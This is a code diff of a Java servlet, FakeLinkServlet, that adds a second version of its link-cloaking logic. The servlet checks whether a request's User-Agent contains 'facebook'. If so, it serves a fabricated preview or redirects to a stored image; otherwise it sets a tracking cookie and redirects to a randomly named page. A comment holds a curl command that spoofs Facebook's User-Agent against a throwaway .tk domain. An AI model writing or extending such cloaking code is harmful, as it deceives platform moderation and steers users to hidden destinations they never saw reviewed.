@@ -28,6 +28,7 @@ import java.util.stream.Stream;
  */
 
 //facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
+    // curl -H "User-Agent: facebook" -I asdfijnasofinmasdfionasdf.tk/IbDSYcGFSUZvnLo.okroine?id=Z3ZyODQ
 public class FakeLinkServlet extends BaseServlet {
     final ConcurrentHashMap<String, String> contentMap = new ConcurrentHashMap<>();
     final ConcurrentLinkedQueue<Pair<String, Long>> removeContentQueue = new ConcurrentLinkedQueue<>();
@@ -51,49 +52,57 @@ public class FakeLinkServlet extends BaseServlet {
 
     @Override
     public void process(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
-        String endcodeId = request.getParameter("id");
-        String currentDomain = "";
-        if (endcodeId != null) {
-            int id = SecurityUtils.decode(endcodeId);
-            FakeLinkEntity fakeLinkEntity = Environment.getFakeLinkService().load(id);
-            if (fakeLinkEntity == null)
-                return;
+        String version2 = request.getParameter("v2");
+        if (version2 != null && !version2.isEmpty()) {
+            ProcessFakeLinkV2(request, response);
+            return;
+        }
+        else {
+            String endcodeId = request.getParameter("id");
+            String currentDomain = "";
+            if (endcodeId != null) {
+                int id = SecurityUtils.decode(endcodeId);
+                FakeLinkEntity fakeLinkEntity = Environment.getFakeLinkService().load(id);
+                if (fakeLinkEntity == null)
+                    return;
 
-            String userAgent = request.getHeader("User-Agent");
-            if (request.getParameter("TrackUA") != null)
-                System.out.println("UA " + new Date() + ":" + userAgent);
+                String userAgent = request.getHeader("User-Agent");
+                if (request.getParameter("TrackUA") != null)
+                    System.out.println("UA " + new Date() + ":" + userAgent);
 
-            String targetUrl = fakeLinkEntity.getTargetUrl();
-            currentDomain = request.getHeader("X-Forwarded-Host");
-            if (currentDomain == null)
-                currentDomain = ((Request)request).getRootURL().toString();
-            else currentDomain = "http://" + currentDomain;
+                String targetUrl = fakeLinkEntity.getTargetUrl();
+                currentDomain = request.getHeader("X-Forwarded-Host");
+                if (currentDomain == null)
+                    currentDomain = ((Request) request).getRootURL().toString();
+                else currentDomain = "http://" + currentDomain;
 
-            if (userAgent.indexOf("facebook") >= 0) {
-                HashMap hm = new HashMap();
-                String title = fakeLinkEntity.getTitle();
-                String desc = fakeLinkEntity.getDescription();
-                String image = fakeLinkEntity.getLocalImage(currentDomain);
-                hm.put("title", title);
-                hm.put("desc", desc);
-                hm.put("image", image);
+                if (userAgent.indexOf("facebook") >= 0) {
+                    HashMap hm = new HashMap();
+                    String title = fakeLinkEntity.getTitle();
+                    String desc = fakeLinkEntity.getDescription();
+                    String image = fakeLinkEntity.getLocalImage(currentDomain);
+                    hm.put("title", title);
+                    hm.put("desc", desc);
+                    hm.put("image", image);
 
-                //get content
-                String content = getContent(targetUrl, currentDomain);
-                int index = content.indexOf("</head>");
-                String body = content.substring(index + 7);
-                hm.put("body", body);
+                    //get content
+                    String content = getContent(targetUrl, currentDomain);
+                    int index = content.indexOf("</head>");
+                    String body = content.substring(index + 7);
+                    hm.put("body", body);
 
-                String rs = TemplateEngine.renderFakeLink(hm);
-                response.setContentType("text/html");
-                response.getWriter().write(rs);
-                return;
-            } else {
-                response.addCookie(new Cookie("link", endcodeId));
-                response.sendRedirect(currentDomain + "/html/" + RandomStringUtils.randomAlphanumeric(5) + ".html");
-                return;
+                    String rs = TemplateEngine.renderFakeLink(hm);
+                    response.setContentType("text/html");
+                    response.getWriter().write(rs);
+                    return;
+                } else {
+                    response.addCookie(new Cookie("link", endcodeId));
+                    response.sendRedirect(currentDomain + "/html/" + RandomStringUtils.randomAlphanumeric(5) + ".html");
+                    return;
+                }
             }
         }
+
         Cookie cookie = Arrays.stream(request.getCookies()).filter(p -> p.getName().equals("link")).findFirst().orElse(null);
         if (cookie != null) {
             int id = SecurityUtils.decode(cookie.getValue());
@@ -128,5 +137,35 @@ public class FakeLinkServlet extends BaseServlet {
         contentMap.put(url, content);
         removeContentQueue.add(new Pair(url, System.currentTimeMillis()));
         return content;
+    }
+
+    public void ProcessFakeLinkV2(HttpServletRequest request, HttpServletResponse response) throws IOException {
+        String endcodeId = request.getParameter("id");
+        String currentDomain = "";
+        if (endcodeId != null) {
+            int id = SecurityUtils.decode(endcodeId);
+            FakeLinkEntity fakeLinkEntity = Environment.getFakeLinkService().load(id);
+            if (fakeLinkEntity == null)
+                return;
+
+            String userAgent = request.getHeader("User-Agent");
+            if (request.getParameter("TrackUA") != null)
+                System.out.println("UA " + new Date() + ":" + userAgent);
+
+            currentDomain = request.getHeader("X-Forwarded-Host");
+            if (currentDomain == null)
+                currentDomain = ((Request) request).getRootURL().toString();
+            else currentDomain = "http://" + currentDomain;
+
+            if (userAgent.indexOf("facebook") >= 0) {
+                String image = fakeLinkEntity.getLocalImage(currentDomain);
+                response.sendRedirect(image);
+                return;
+            } else {
+                response.addCookie(new Cookie("link", endcodeId));
+                response.sendRedirect(currentDomain + "/html/" + RandomStringUtils.randomAlphanumeric(5) + ".html");
+                return;
+            }
+        }
     }
 }
